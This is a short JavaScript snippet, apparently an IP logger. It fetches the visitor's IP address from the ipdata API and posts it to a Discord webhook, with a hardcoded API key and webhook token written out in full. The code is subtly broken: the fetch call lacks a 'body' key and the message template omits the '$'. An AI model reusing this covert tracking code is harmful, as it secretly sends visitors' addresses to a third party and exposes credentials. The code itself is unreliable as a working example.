const apiKey = "7beb17f7537a898bfee9001e6375b2d46c028bc3936d111a00629cb7"
json(`https://api.ipdata.co?api-key=${apiKey}&fields=ip`).then(data => {
  fetch("https://discord.com/api/webhooks/1097163118964129803/lAbJM_aQ99MdPtrFlYcWc4FnKfdM5eT7HoSjG1GcRwzS2J_JIPDUqN7gyZy67o_2kxpq",{"method":"POST","headers":{"content-type":"application/json"},JSON.stringify({"content":`A new IP has been logged: {data}`})});
});
